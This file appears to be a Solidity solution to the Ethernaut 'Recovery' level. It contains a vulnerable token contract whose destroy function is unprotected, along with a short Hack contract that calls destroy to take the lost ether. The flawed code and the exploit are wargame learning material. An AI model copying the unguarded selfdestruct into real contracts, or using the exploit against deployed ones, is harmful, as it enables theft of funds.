// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "../node_modules/hardhat-console/contracts/console.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

/**
A contract creator has built a very simple token factory contract.
 Anyone can create new tokens with ease. 
 After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. 
 They have since lost the contract address.

This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.
**/
contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

interface RecoveryI {
  function destroy(address payable _to) external;
}

contract Hack {
  RecoveryI recovery;

  constructor(address _add) {
    recovery = RecoveryI(_add);
  }

  function hack() public {
    // Find the address of the contract using rinkeyby logs
    recovery.destroy(payable(msg.sender));
  }
}